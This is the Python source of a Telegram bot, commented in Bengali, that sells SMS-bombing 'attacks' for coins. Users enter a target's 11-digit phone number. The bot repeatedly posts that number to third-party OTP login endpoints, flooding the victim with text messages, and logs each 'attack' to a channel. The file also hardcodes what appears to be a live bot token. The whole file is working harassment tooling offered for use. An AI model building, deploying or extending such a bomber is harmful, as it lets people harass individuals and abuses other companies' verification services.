import telebot
import requests
import json
import os
import time
import threading
import random
from telebot import types
from datetime import datetime

# --- কনফিগারেশন ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 8504263842 
LOG_CHANNEL = "@sMsBotManagerDUModz" 
REQUIRED_CHANNEL = "@DemoTestDUModz" 
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- ডাটাবেস হ্যান্ডলিং ---
def load_db(file):
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump({}, f)
        return {}
    try:
        with open(file, 'r') as f: return json.load(f)
    except: return {}

def save_db(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=4)

users = load_db('users.json')
keys = load_db('keys.json')

# --- হেল্পার ফাংশন ---
def send_log(text):
    try:
        bot.send_message(LOG_CHANNEL, f"✨ **[LOG]**\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n{text}")
    except: pass

def is_joined(user_id):
    try:
        status = bot.get_chat_member(REQUIRED_CHANNEL, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return True # API Error এড়াতে

def update_user_data(user):
    uid = str(user.id)
    if uid not in users:
        users[uid] = {
            "name": user.first_name,
            "username": f"@{user.username}" if user.username else "N/A",
            "status": "Active",
            "coins": 50,
            "sent": 0
        }
        save_db('users.json', users)
        send_log(f"🆕 **New User Registered:**\n👤 Name: {user.first_name}\n🆔 ID: `{uid}`")
    return users[uid]

# --- এনিমেশন ইফেক্ট ---
def get_loading_markup():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("⏳ Processing...", callback_data="none"))
    return markup

# --- কমান্ড হ্যান্ডলারস ---

@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    u = update_user_data(message.from_user)

    # জয়েন চেক
    if not is_joined(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Our Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}"))
        markup.add(types.InlineKeyboardButton("🔄 Verify Join", callback_data="start_over"))
        bot.send_message(message.chat.id, "❌ **Access Denied!**\n\nPlease join our official channel to use this bot.", reply_markup=markup)
        return

    # ব্লকড চেক
    if u['status'] == "Blocked":
        bot.send_message(message.chat.id, "🚫 **Account Blocked!**\n\nYour account has been restricted. Contact Admin for help.\n👤 Admin: @DarkUnkwon")
        return

    # মেইন মেনু
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Start Attack", callback_data="bomb_menu"),
        types.InlineKeyboardButton("👤 My Profile", callback_data="profile")
    )
    markup.add(
        types.InlineKeyboardButton("🔑 Use Key", callback_data="use_key"),
        types.InlineKeyboardButton("🏆 Top Users", callback_data="top_users")
    )
    
    welcome_text = (
        f"👋 **Welcome Back, {u['name']}!**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💎 Status: `{u['status']}`\n"
        f"💰 Balance: `{u['coins']} Coins`\n"
        f"📊 Total Sent: `{u['sent']}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ _Choose an option below to continue._"
    )
    bot.send_photo(message.chat.id, LOGO_URL, caption=welcome_text, reply_markup=markup)

# --- এডমিন কমান্ডস ---

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID: return
    
    panel = (
        "👑 **Admin Control Panel**\n\n"
        "📊 `/stats` - System Overview\n"
        "👥 `/users` - Total User List\n"
        "⚙️ `/setstatus [ID] [Status]` - Change User Status\n"
        "💰 `/addcoins [ID] [Amount]` - Add Coins\n"
        "🔑 `/gen [Amount]` - Generate Key\n"
        "📢 `/broadcast [Message]` - Send Global Message"
    )
    bot.reply_to(message, panel)

@bot.message_handler(commands=['stats'])
def admin_stats(message):
    if message.from_user.id != ADMIN_ID: return
    total_u = len(users)
    total_s = sum(u['sent'] for u in users.values())
    bot.reply_to(message, f"📊 **Bot Stats:**\n\nTotal Users: `{total_u}`\nTotal SMS Sent: `{total_s}`\nKeys Active: `{len(keys)}`")

@bot.message_handler(commands=['users'])
def admin_userlist(message):
    if message.from_user.id != ADMIN_ID: return
    text = "👥 **User Database:**\n\n"
    for uid, data in users.items():
        text += f"👤 `{uid}` | {data['status']} | 💰{data['coins']}\n"
        if len(text) > 3000:
            bot.send_message(message.chat.id, text)
            text = ""
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['setstatus'])
def admin_setstatus(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, target_id, new_status = message.text.split()
        if target_id in users:
            users[target_id]['status'] = new_status
            save_db('users.json', users)
            bot.reply_to(message, f"✅ Status updated for `{target_id}` to `{new_status}`")
            send_log(f"🛠 **Status Change:**\nUser: `{target_id}`\nNew Status: `{new_status}`")
    except: bot.reply_to(message, "Usage: `/setstatus ID Status` (Active/Blocked/Lifetime)")

@bot.message_handler(commands=['addcoins'])
def admin_addcoins(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, target_id, amount = message.text.split()
        if target_id in users:
            users[target_id]['coins'] += int(amount)
            save_db('users.json', users)
            bot.reply_to(message, f"✅ Added `{amount}` coins to `{target_id}`")
        else: bot.reply_to(message, "User ID not found!")
    except: bot.reply_to(message, "Usage: `/addcoins ID Amount`")

@bot.message_handler(commands=['gen'])
def admin_genkey(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        amount = int(message.text.split()[1])
        new_key = f"DU-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}"
        keys[new_key] = amount
        save_db('keys.json', keys)
        bot.reply_to(message, f"🔑 **Key Generated:**\n`{new_key}`\nValue: `{amount} Coins`")
    except: bot.reply_to(message, "Usage: `/gen Amount`")

# --- কলব্যাক হ্যান্ডলার ---

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    uid = str(call.from_user.id)
    u_data = users.get(uid)

    if call.data == "start_over":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start(call.message)

    elif call.data == "profile":
        profile_text = (
            f"👤 **User Profile**\n\n"
            f"Name: {u_data['name']}\n"
            f"ID: `{uid}`\n"
            f"Status: `{u_data['status']}`\n"
            f"Coins: `{u_data['coins']}`\n"
            f"Total Sent: `{u_data['sent']}`"
        )
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, profile_text)

    elif call.data == "bomb_menu":
        if u_data['status'] == "Blocked":
            bot.answer_callback_query(call.id, "🚫 You are blocked!", show_alert=True)
            return
        
        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Phone Number (11 Digit):**")
        bot.register_next_step_handler(msg, process_number)

    elif call.data == "use_key":
        msg = bot.send_message(call.message.chat.id, "🔑 **Enter Your Recharge Key:**")
        bot.register_next_step_handler(msg, process_key)

# --- বোম্বিং লজিক ---

def process_number(message):
    num = message.text
    if len(num) == 11 and num.isdigit():
        msg = bot.send_message(message.chat.id, "🔢 **Enter Amount of SMS (Max 100):**\n_Note: 5 Coins per SMS_")
        bot.register_next_step_handler(msg, lambda m: process_amount(m, num))
    else:
        bot.send_message(message.chat.id, "❌ Invalid Number! Please try again.")

def process_amount(message, num):
    try:
        amount = int(message.text)
        if amount > 100: amount = 100
        if amount < 1: return

        uid = str(message.from_user.id)
        cost = amount * 5
        
        if users[uid]['status'] != 'Lifetime' and users[uid]['coins'] < cost:
            bot.send_message(message.chat.id, f"⚠️ **Insufficient Coins!**\nRequired: `{cost}`\nAvailable: `{users[uid]['coins']}`")
            return

        status_msg = bot.send_message(message.chat.id, "🌀 **Initializing Security Layers...**")
        time.sleep(1)
        bot.edit_message_text("⚡ **Encrypting Attack Packet...**", status_msg.chat.id, status_msg.message_id)
        time.sleep(1)
        
        threading.Thread(target=bomb_engine, args=(uid, num, amount, cost, status_msg)).start()
    except:
        bot.send_message(message.chat.id, "❌ Invalid Amount!")

def bomb_engine(uid, num, amount, cost, status_msg):
    success = 0
    # URLs (Replace with your working APIs)
    api_list = [
        "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        "https://bikroy.com/data/relative/login-with-otp"
    ]
    
    for i in range(1, amount + 1):
        try:
            # সিমুলেশন রিকুয়েষ্ট (আপনার API এখানে বসান)
            api_url = random.choice(api_list)
            payload = {"phone": num, "number": "+88"+num}
            r = requests.post(api_url, json=payload, timeout=5)
            
            if r.status_code == 200:
                success += 1
            
            # আল্ট্রা মোশন এনিমেশন আপডেট
            if i % 5 == 0 or i == amount:
                progress = "▓" * (i // 10) + "░" * (10 - (i // 10))
                bot.edit_message_text(
                    f"🚀 **Attack in Progress...**\n\n"
                    f"Target: `{num}`\n"
                    f"Progress: [{progress}] {i}/{amount}\n"
                    f"Status: `Sending Packets...`",
                    status_msg.chat.id, status_msg.message_id
                )
            time.sleep(0.3)
        except:
            pass

    # কয়েন ডিডাকশন ও ডাটা আপডেট
    if users[uid]['status'] != 'Lifetime':
        users[uid]['coins'] -= cost
    users[uid]['sent'] += success
    save_db('users.json', users)

    final_text = (
        f"✅ **Attack Finished!**\n\n"
        f"🎯 Target: `{num}`\n"
        f"📩 Sent Successfully: `{success}`\n"
        f"💰 Coins Deducted: `{cost}`\n"
        f"💳 Remaining Balance: `{users[uid]['coins']}`\n\n"
        f"🔥 *Want to attack again? Click Start Attack.*"
    )
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🚀 New Attack", callback_data="bomb_menu"))
    
    bot.edit_message_text(final_text, status_msg.chat.id, status_msg.message_id, reply_markup=markup)
    send_log(f"🚀 **Attack Log:**\nUser: {users[uid]['name']}\nTarget: `{num}`\nAmount: `{success}`")

# --- কি রিডিম সিস্টেম ---

def process_key(message):
    key = message.text.strip()
    uid = str(message.from_user.id)
    
    if key in keys:
        amount = keys[key]
        users[uid]['coins'] += amount
        del keys[key]
        save_db('users.json', users)
        save_db('keys.json', keys)
        bot.send_message(message.chat.id, f"✅ **Success!**\nAdded `{amount}` coins to your account.")
        send_log(f"🔑 **Key Redeemed:**\nUser: {users[uid]['name']}\nKey: `{key}`\nValue: `{amount}`")
    else:
        bot.send_message(message.chat.id, "❌ Invalid or Expired Key!")

# --- বট রান ---
if __name__ == "__main__":
    print("DU ModZ Pro Bot is running...")
    send_log("✅ **Bot is Online & System Secure.**")
    bot.infinity_polling()
